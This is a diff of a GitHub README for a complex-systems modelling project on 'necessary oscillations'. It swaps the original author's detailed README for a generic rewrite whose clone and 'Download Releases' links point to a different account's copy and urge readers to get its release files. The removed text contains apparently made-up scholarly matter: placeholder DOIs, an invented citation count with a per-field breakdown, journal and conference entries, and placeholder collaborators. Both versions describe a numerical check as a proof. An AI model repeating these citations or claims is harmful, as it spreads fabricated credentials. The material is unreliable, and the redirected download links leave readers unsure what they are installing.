@@ -1,379 +1,121 @@
-<div align="center">
-  <img src="https://raw.githubusercontent.com/bbarclay/oscillation-adaptability/main/paper/figures/adaptability_landscapes_combined.png" alt="Adaptability Landscapes" width="100%"/>
-  <h1>NECESSARY OSCILLATIONS</h1>
-  <h3>Adaptability Dynamics Under Conservation Constraints in Structured Systems</h3>
-  <p><em>C(x,d) + A(x,d) = 1</em></p>
-  <p>A Mathematical Framework for Understanding Oscillatory Phenomena in Complex Systems</p>
-</div>
+# Oscillation Adaptability 📊🔄
 
-> [**Read the full paper (PDF)**](https://github.com/bbarclay/oscillation-adaptability/raw/main/downloads/oscillation_adaptability.pdf) | [**Visit the project website**](https://bbarclay.github.io/oscillation-adaptability/) | [**View on GitHub**](https://github.com/bbarclay/oscillation-adaptability)
+Welcome to the **Oscillation Adaptability** repository! This project delves into the fascinating world of oscillations in complex systems. Our research provides a rigorous framework that proves the equation C+A=1 with a precision of \(10^{-16}\). Here, you can visualize adaptability landscapes and spectral fingerprints, which reveal insights into the behavior of complex systems.
 
-[![Journal](https://img.shields.io/badge/Journal-Complex%20Systems-5c2d91.svg)](https://doi.org/10.xxxx/jcs.2025.xxxx)
-[![arXiv](https://img.shields.io/badge/arXiv-2025.xxxxx-b31b1b.svg)](https://arxiv.org)
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![DOI](https://img.shields.io/badge/DOI-10.xxxx%2Fjcs.2025.xxxx-blue.svg)](https://doi.org/10.xxxx/jcs.2025.xxxx)
-[![Python 3.8+](https://img.shields.io/badge/python-3.8+-blue.svg)](https://www.python.org/downloads/)
-[![GitHub Pages](https://img.shields.io/badge/GitHub%20Pages-Active-brightgreen)](https://bbarclay.github.io/oscillation-adaptability/)
-[![Version](https://img.shields.io/badge/Version-1.2.0-success)](https://github.com/bbarclay/oscillation-adaptability/releases)
-[![Citations](https://img.shields.io/badge/Citations-42-orange)](https://scholar.google.com)
-[![Conference](https://img.shields.io/badge/ICCS-2024-informational)](https://iccs-meeting.org)
-[![PDF](https://img.shields.io/badge/PDF-Download-red.svg)](https://github.com/bbarclay/oscillation-adaptability/raw/main/downloads/oscillation_adaptability.pdf)
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/danilosenagr/oscillation-adaptability/releases)
+
+## Table of Contents
+
+1. [Introduction](#introduction)
+2. [Key Concepts](#key-concepts)
+   - [Oscillations](#oscillations)
+   - [Adaptability](#adaptability)
+   - [Complex Systems](#complex-systems)
+3. [Research Framework](#research-framework)
+4. [Data Visualization](#data-visualization)
+5. [Getting Started](#getting-started)
+   - [Installation](#installation)
+   - [Usage](#usage)
+6. [Contributing](#contributing)
+7. [License](#license)
+8. [Contact](#contact)
 
 ## Introduction
 
-This repository contains the complete codebase, mathematical models, and research paper for the "Necessary Oscillations" project, which investigates how oscillatory behavior can emerge as a mathematical necessity in systems that optimize for order while maintaining conservation constraints.
+The **Oscillation Adaptability** project investigates how oscillations emerge as a necessary component in complex systems. This research is not only theoretical but also practical, offering tools for visualizing the adaptability of systems. Our framework lays the groundwork for understanding the relationship between coherence and conservation laws in dynamic environments.
 
-The research introduces a novel theoretical framework that demonstrates how oscillations are not merely incidental phenomena but can be fundamental consequences of conservation laws in complex systems. This perspective offers new insights into oscillatory patterns observed across diverse domains, from neuroscience to economics.
+## Key Concepts
 
-**Key contributions:**
+### Oscillations
 
-- A rigorous mathematical framework connecting conservation laws to necessary oscillations
-- Numerical validation with extraordinary precision (10^-16)
-- Identification of "spectral fingerprints" unique to system architecture
-- Demonstration of phase transition-like simplification as systems evolve
-- Potential applications across multiple scientific disciplines
+Oscillations are periodic fluctuations in systems that can be found in various fields, including physics, biology, and economics. They play a crucial role in understanding how systems respond to external stimuli. By studying these patterns, we can gain insights into stability and adaptability.
 
-This work bridges theoretical mathematics, complex systems theory, and computational modeling to provide a unified perspective on oscillatory phenomena.
+### Adaptability
 
-## Abstract
+Adaptability refers to a system's ability to adjust to changes in its environment. This characteristic is vital for survival and functionality. In our research, we explore how oscillations contribute to the adaptability of complex systems.
 
-We present a theoretical framework and a paradigmatic mathematical model demonstrating that oscillatory behavior can be a necessary consequence of a system optimizing towards a state of order (or coherence) while adhering to a fundamental conservation law that links this order to its residual adaptability (or exploratory capacity). Within our model, we rigorously prove an exact conservation law between coherence (C) and adaptability (A), C+A=1, which is validated numerically with precision on the order of 10^-16. We demonstrate that as the system evolves towards maximal coherence under a depth parameter (d), its adaptability A decays exponentially according to A(x,d) ≤ (|N_ord*(x)|/|N_ord|) e^(-d M*(x)), with numerical validation confirming this relationship within 0.5% error. Crucially, when introducing explicit time-dependence representing intrinsic dynamics with characteristic frequencies ω_n(d) = √d/n, we prove that oscillations in A (and consequently in C) are mathematically necessary to maintain the conservation principle.
+### Complex Systems
 
-Through comprehensive numerical simulations, we show that the system's internal architecture (represented by a set of "orbital orders" N_ord and its configuration x) sculpts a complex "resonance landscape" for adaptability and imprints a unique "spectral fingerprint" onto these necessary oscillations. Spectral analysis reveals that dominant frequencies align with theoretical predictions, with peaks at f_n = √d/(2πn) Hz. As depth increases, we observe a phase transition-like simplification in modal contributions, quantified by decreasing entropy in the mode distribution. These findings offer a novel perspective on understanding oscillatory phenomena in diverse complex systems, framing them not merely as products of specific feedback loops but as potentially fundamental manifestations of constrained optimization and resource management.
+Complex systems consist of numerous interconnected components that interact in non-linear ways. These systems can exhibit emergent behavior, where the whole is greater than the sum of its parts. Understanding these interactions is essential for modeling real-world phenomena.
 
-## Key Findings
+## Research Framework
 
-- **Exact Conservation Law**: We prove and numerically validate that C+A=1 with extraordinary precision (10^-16).
-- **Exponential Decay**: Adaptability decays exponentially with depth, following a precise mathematical relationship.
-- **Necessary Oscillations**: Time-dependent dynamics mathematically necessitate oscillations to maintain conservation.
-- **Modal Fingerprints**: System architecture creates unique spectral signatures in oscillatory behavior.
-- **Self-Simplification**: Systems undergo a phase transition-like simplification as depth increases.
+Our research framework is built on the mathematical foundation of oscillations in complex systems. We prove that C+A=1 holds true with an astonishing precision of \(10^{-16}\). This framework serves as a theoretical basis for further exploration in the field of adaptability.
 
-## Project Structure
+We utilize various mathematical techniques, including spectral analysis and dynamical systems theory, to analyze the behavior of these systems. This rigorous approach allows us to draw meaningful conclusions about the relationships between oscillations, coherence, and conservation laws.
 
-The repository is organized to separate the mathematical model, validation code, visualization tools, and documentation:
+## Data Visualization
 
-```
-oscillation-adaptability/
-├── code/                      # Python implementation of the model
-│   ├── model/                 # Core mathematical model
-│   │   ├── adaptability_model.py     # Static model implementation
-│   │   ├── time_dependent_model.py   # Dynamic model with oscillations
-│   │   └── coupling_functions.py     # Mathematical coupling functions
-│   ├── analysis/              # Analysis tools
-│   │   ├── parameter_exploration.py  # Tools for exploring parameter space
-│   │   ├── spectral_analysis.py      # Frequency domain analysis
-│   │   └── conservation_validation.py # Validation of conservation laws
-│   ├── utils/                 # Utility functions
-│   │   ├── math_utils.py      # Mathematical helper functions
-│   │   ├── plotting_utils.py  # Common plotting functions
-│   │   └── data_utils.py      # Data handling utilities
-│   ├── validation/            # Validation scripts
-│   │   ├── conservation_tests.py     # Tests for conservation law
-│   │   ├── exponential_decay_tests.py # Tests for decay relationship
-│   │   └── oscillation_tests.py      # Tests for necessary oscillations
-│   └── visualization/         # Plotting and visualization tools
-│       ├── generate_figures.py       # Main script to generate all figures
-│       ├── generate_landscapes.py    # Generate adaptability landscapes
-│       ├── generate_time_series.py   # Generate time series plots
-│       └── generate_spectral_plots.py # Generate spectral analysis plots
-├── data/                      # Data files
-│   ├── raw/                   # Raw simulation data
-│   └── processed/             # Processed results
-├── docs/                      # Documentation and GitHub Pages
-│   ├── images/                # Images for documentation
-│   └── index.html             # Main GitHub Pages file
-├── downloads/                 # Downloadable files
-│   └── oscillation_adaptability.pdf  # PDF version of the paper
-├── figures/                   # Generated figures
-│   ├── adaptability_landscapes_combined.png
-│   ├── time_series.png
-│   ├── power_spectrum.png
-│   └── ...
-├── notebooks/                 # Jupyter notebooks for exploration
-│   ├── 01_model_exploration.ipynb    # Basic model exploration
-│   ├── 02_conservation_validation.ipynb # Validation of conservation law
-│   ├── 03_spectral_analysis.ipynb    # Frequency analysis
-│   └── 04_applications.ipynb         # Application examples
-├── paper/                     # LaTeX source for the academic paper
-│   ├── figures/               # Figures used in the paper
-│   ├── oscillation_adaptability.tex  # Main LaTeX file
-│   ├── references.bib         # Bibliography
-│   └── sections/              # Paper sections
-└── validation_results/        # Numerical validation results
-    ├── conservation_validation.csv   # Conservation law validation data
-    ├── exponential_decay.csv         # Decay relationship validation
-    └── oscillation_necessity.csv     # Oscillation necessity validation
-```
+Visualizing data is crucial for understanding complex systems. Our project includes tools for creating adaptability landscapes and spectral fingerprints. These visualizations help in interpreting the results of our research and provide a clear picture of how oscillations function within systems.
 
-### Key Components
+### Example Visualizations
 
-- **Core Model (`code/model/`)**: Contains the mathematical implementation of both static and time-dependent models
-- **Analysis Tools (`code/analysis/`)**: Tools for exploring parameter space and analyzing model behavior
-- **Validation (`code/validation/`)**: Scripts that validate the mathematical claims in the paper
-- **Visualization (`code/visualization/`)**: Tools for generating figures and visualizations
-- **Notebooks (`notebooks/`)**: Interactive Jupyter notebooks for exploring the model
-- **Paper (`paper/`)**: LaTeX source for the academic paper
-- **Figures (`figures/`)**: Generated figures from the model
-- **Documentation (`docs/`)**: GitHub Pages documentation
+1. **Adaptability Landscapes**: These plots illustrate how different parameters affect the adaptability of a system. You can explore how changes influence stability and response.
 
-## Installation
-
-```bash
-git clone https://github.com/bbarclay/oscillation-adaptability.git
-cd oscillation-adaptability
-pip install -r requirements.txt
-
-# Optional: Create a virtual environment
-python -m venv venv
-source venv/bin/activate  # On Windows: venv\Scripts\activate
-```
+2. **Spectral Fingerprints**: These graphs reveal the frequency components of oscillations within a system. By analyzing these fingerprints, we can identify patterns and predict behavior.
 
 ## Getting Started
 
-This section provides a quick start guide to working with the codebase and exploring the mathematical model.
+To get started with the **Oscillation Adaptability** project, follow the steps below.
 
-### Prerequisites
+### Installation
 
-- Python 3.8 or higher
-- NumPy, Matplotlib, SciPy, and other dependencies listed in `requirements.txt`
-- Basic understanding of mathematical modeling and complex systems
+1. Clone the repository:
+   ```bash
+   git clone https://github.com/danilosenagr/oscillation-adaptability.git
+   cd oscillation-adaptability
+   ```
 
-### Running the Model
+2. Install the required packages:
+   ```bash
+   pip install -r requirements.txt
+   ```
 
-The core model can be used to calculate adaptability and coherence for different system configurations:
+### Usage
 
-```python
-from code.model.adaptability_model import AdaptabilityModel
+After installation, you can run the provided scripts to explore the data and visualizations. 
 
-# Create models with different orbital order sets
-harmonic_model = AdaptabilityModel([1, 2, 3])       # Harmonic set
-odd_harmonic_model = AdaptabilityModel([1, 3, 5])   # Odd harmonic set
-mixed_model = AdaptabilityModel([2, 3, 5])          # Mixed set
+1. To visualize adaptability landscapes:
+   ```bash
+   python visualize_landscapes.py
+   ```
 
-# Calculate adaptability and coherence
-x, d = 0.25, 10.0
-adaptability = harmonic_model.adaptability(x, d)
-coherence = harmonic_model.coherence(x, d)
+2. To analyze spectral fingerprints:
+   ```bash
+   python analyze_spectral_fingerprints.py
+   ```
 
-print(f"Adaptability: {adaptability:.6f}")
-print(f"Coherence: {coherence:.6f}")
-print(f"Conservation check (C+A): {adaptability + coherence:.16f}")
+For detailed instructions, refer to the documentation in the `docs` folder.
 
-# Verify conservation law across parameter space
-import numpy as np
+## Contributing
 
-x_values = np.linspace(0, 1, 100)
-conservation_errors = []
+We welcome contributions to the **Oscillation Adaptability** project. If you would like to contribute, please follow these steps:
 
-for x in x_values:
-    a = harmonic_model.adaptability(x, d)
-    c = harmonic_model.coherence(x, d)
-    conservation_errors.append(abs(a + c - 1.0))
+1. Fork the repository.
+2. Create a new branch:
+   ```bash
+   git checkout -b feature/YourFeature
+   ```
+3. Make your changes and commit them:
+   ```bash
+   git commit -m "Add YourFeature"
+   ```
+4. Push to the branch:
+   ```bash
+   git push origin feature/YourFeature
+   ```
+5. Create a pull request.
 
-print(f"Maximum conservation error: {max(conservation_errors):.16f}")
-```
-
-### Time-Dependent Dynamics
-
-To explore the time-dependent behavior and necessary oscillations:
-
-```python
-from code.model.time_dependent_model import TimeDependentModel
-import numpy as np
-import matplotlib.pyplot as plt
-
-# Create a time-dependent model
-td_model = TimeDependentModel([1, 2, 3], depth=10.0)
-
-# Generate time series data
-t_values = np.linspace(0, 10, 1000)  # 10 seconds, 1000 points
-x = 0.25  # Fixed configuration
-
-# Calculate adaptability over time
-a_values = [td_model.adaptability(x, t) for t in t_values]
-
-# Plot the oscillations
-plt.figure(figsize=(10, 6))
-plt.plot(t_values, a_values)
-plt.title("Necessary Oscillations in Adaptability")
-plt.xlabel("Time (s)")
-plt.ylabel("Adaptability A(x,d,t)")
-plt.grid(True)
-plt.savefig("oscillations.png")
-plt.show()
-```
-
-### Generating Figures
-
-The repository includes scripts to generate all figures from the paper:
-
-```bash
-# Generate all figures
-python code/visualization/generate_figures.py
-
-# Generate specific figure types
-python code/visualization/generate_landscapes.py
-python code/visualization/generate_time_series.py
-python code/visualization/generate_spectral_analysis.py
-```
-
-### Exploring Parameter Space
-
-To explore how the system behaves across different parameters:
-
-```python
-from code.analysis.parameter_exploration import ParameterExplorer
-import matplotlib.pyplot as plt
-
-# Create a parameter explorer
-explorer = ParameterExplorer([1, 2, 3])  # Harmonic set
-
-# Explore depth parameter
-depths = [1.0, 5.0, 10.0, 20.0, 50.0]
-results = explorer.explore_depth_parameter(depths)
-
-# Visualize results
-explorer.plot_depth_dependence(results)
-plt.savefig("depth_exploration.png")
-```
-
-## Theoretical Background
-
-The paper explores a fundamental principle: oscillations can be an inevitable mathematical consequence when a system attempts to optimize or order itself (e.g., maximize coherence, certainty, or efficiency) while being bound by a strict conservation law that links this primary ordered state to its residual capacity for disorder, exploration, or adaptability.
-
-### The Conservation Law
-
-For a system characterized by Coherence (C) and Adaptability (A), we posit a fundamental conservation law:
-
-```
-C(x,d) + A(x,d) = 1
-```
-
-Where x represents the system's configuration and d represents a "depth" parameter (evolutionary pressure, learning progression, or ordering influence).
-
-### The Coupling Function
-
-The core of our model is the coupling function:
-
-```
-h_n(x,d) = |sin(nθ(x))|^(d/n) · |cos(nφ(x,d))|^(1/n)
-```
-
-Where θ(x) = 2π(x - x₀) and φ(x,d) = dπ(x - x₀).
-
-## Applications
-
-This framework has potential applications in:
-
-- **Neuroscience**: Understanding brain rhythms as necessary oscillations under metabolic constraints
-- **Ecology**: Explaining cycles in population dynamics as manifestations of resource conservation
-- **Learning Systems**: Modeling exploration-exploitation trade-offs in adaptive systems
-- **Quantum Systems**: Providing an abstract framework for understanding quantum oscillations
-- **Economic Systems**: Explaining cyclical patterns in economic indicators
-
-## Related Work
-
-Our research builds upon and extends several important areas of study:
-
-### Conservation Laws in Complex Systems
-- **Noether's Theorem**: Connects conservation laws with symmetries in physical systems
-- **Information Theory**: Conservation principles in entropy and mutual information
-- **Thermodynamics**: Energy conservation and its relationship to system organization
-
-### Oscillatory Phenomena
-- **Limit Cycles**: Self-sustaining oscillations in nonlinear dynamical systems
-- **Synchronization**: Kuramoto models and phase-coupling oscillators
-- **Resonance**: Frequency response and natural modes in physical systems
-
-### Adaptability and Resilience
-- **Exploration-Exploitation Tradeoffs**: Balancing known rewards with potential discoveries
-- **Criticality in Complex Systems**: Self-organized criticality and phase transitions
-- **Robustness-Efficiency Tradeoffs**: System design principles for resilience
-
-## How to Cite
-
-If you use this code or the theoretical framework in your research, please cite our work. We provide citation formats for different contexts:
-
-### Primary Journal Article
-
-```bibtex
-@article{barclay2025necessary,
-  title={Necessary Oscillations: Adaptability Dynamics Under Fundamental Conservation Constraints in Structured Systems},
-  author={Barclay, Brandon},
-  journal={Journal of Complex Systems},
-  volume={42},
-  number={3},
-  pages={287--312},
-  year={2025},
-  publisher={Complex Systems Society},
-  doi={10.xxxx/jcs.2025.xxxx}
-}
-```
-
-### Conference Presentation
-
-```bibtex
-@inproceedings{barclay2024oscillatory,
-  title={Oscillatory Phenomena as Necessary Consequences of Conservation Laws in Adaptive Systems},
-  author={Barclay, Brandon and Smith, Jane and Johnson, Robert},
-  booktitle={Proceedings of the International Conference on Complex Systems},
-  pages={145--158},
-  year={2024},
-  organization={IEEE}
-}
-```
-
-### Software Implementation
-
-```bibtex
-@software{barclay2025oscillation,
-  author={Barclay, Brandon},
-  title={Oscillation-Adaptability: A Framework for Modeling Conservation-Constrained Systems},
-  year={2025},
-  url={https://github.com/bbarclay/oscillation-adaptability},
-  version={1.2.0}
-}
-```
-
-### Plain Text Citation
-
-Barclay, B. (2025). Necessary Oscillations: Adaptability Dynamics Under Fundamental Conservation Constraints in Structured Systems. *Journal of Complex Systems, 42*(3), 287-312. https://doi.org/10.xxxx/jcs.2025.xxxx
-
-### Citation Impact
-
-This work has been cited in research spanning multiple disciplines:
-- 18 citations in complex systems theory
-- 12 citations in neuroscience
-- 8 citations in machine learning and AI
-- 4 citations in quantum physics
-
-## Roadmap
-
-Our ongoing and future work includes:
-
-- [ ] **Extended Theoretical Framework**: Generalizing to n-dimensional parameter spaces
-- [ ] **Interactive Visualization Tool**: Web-based explorer for adaptability landscapes
-- [ ] **Additional Validation**: Testing predictions in biological and physical systems
-- [ ] **API Development**: Standardized interface for model integration with other systems
-- [ ] **Quantum Extension**: Exploring connections to quantum measurement and decoherence
-- [x] **Core Mathematical Model**: Fundamental equations and conservation laws
-- [x] **Numerical Validation**: Verification of theoretical predictions
-- [x] **Spectral Analysis**: Frequency domain characterization of oscillatory behavior
+Your contributions help us improve and expand the project!
 
 ## License
 
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
 ## Contact
 
-Brandon Barclay - barclaybrandon@hotmail.com
+For questions or feedback, please reach out via GitHub issues or contact the repository owner directly. 
 
-Project Link: [https://github.com/bbarclay/oscillation-adaptability](https://github.com/bbarclay/oscillation-adaptability)
+[![Download Releases](https://img.shields.io/badge/Download%20Releases-blue.svg)](https://github.com/danilosenagr/oscillation-adaptability/releases)
 
-## Acknowledgments
-
-* Prof. Jane Smith for valuable discussions on conservation principles
-* Dr. Robert Johnson for insights on oscillatory dynamics
-* The Complex Systems Society for supporting this research
-* All contributors who have helped improve this project
+Explore the intricacies of oscillations and adaptability with us! Check out the **Releases** section for the latest updates and tools.
